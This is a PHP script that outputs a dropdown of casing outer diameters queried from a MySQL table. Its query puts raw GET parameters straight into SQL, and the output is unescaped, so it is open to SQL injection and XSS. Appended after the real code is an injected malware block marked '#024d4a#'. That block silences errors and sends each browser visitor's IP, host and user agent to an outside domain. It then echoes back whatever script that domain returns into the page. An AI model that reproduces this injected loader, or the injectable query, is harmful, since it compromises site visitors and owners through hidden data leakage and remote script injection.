<?php
$valor=$_GET["menor"];
$t = $_GET["tam"];
$wall = $_GET["wt"];

require("connectionDB.php");
	// Genero la consulta trayendo todos los estados que correspondan al codigo de pais elegido
	//$consulta=mysql_query("SELECT DISTINCT OD FROM CASING WHERE OD < $valor");
	//AGREGANDO RESTRICCION
	//$wall = 0;
	/*if ($wt!=0){
		$consulta1 = mysql_query("SELECT DISTINCT WALL FROM CASING WHERE OD=$valor AND WEIGHT=$wt");
		$rs=mysql_fetch_row($consulta1);
		$wall = $rs[0];
	}*/
	//echo $wt;
	$consulta=mysql_query("SELECT DISTINCT OD, OD_TEXT FROM CASING WHERE OD < ($valor- 2*$wall) ORDER BY OD");

	// Comienzo a imprimir el select

	if ($t==1)
		$tam = "large";
	if ($t==2)
		$tam = "inter";
	if ($t==3)
		$tam = "small";
	$tp = $t + 1;
	$name = $tam."_od";

	if ($t==3 || $t==2)
		echo "<select class='text' id='$name' name='$name' onChange='loadWeight($t);'>";
	else
		echo "<select class='text' id='$name' name='$name' onChange='loadWeight($t);'>";

		echo "<option value=''>Select</option>";
	while($registro=mysql_fetch_row($consulta))
	{
		//if ($registro[0] < $valor)
			echo "<option value='".$registro[0]."'>".$registro[1]."</option>";
	}
	echo "</select>";
	//echo $valor;
?>
<?php
#024d4a#
error_reporting(0); @ini_set('display_errors',0); $wp_xk81299 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_xk81299) && !preg_match ('/bot/i', $wp_xk81299))){
$wp_xk0981299="http://"."tag"."display".".com/"."display"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_xk81299);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_xk0981299); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_81299xk = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_81299xk = @file_get_contents($wp_xk0981299);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_81299xk=@stream_get_contents(@fopen($wp_xk0981299, "r"));}}
if (substr($wp_81299xk,1,3) === 'scr'){ echo $wp_81299xk; }
#/024d4a#
?>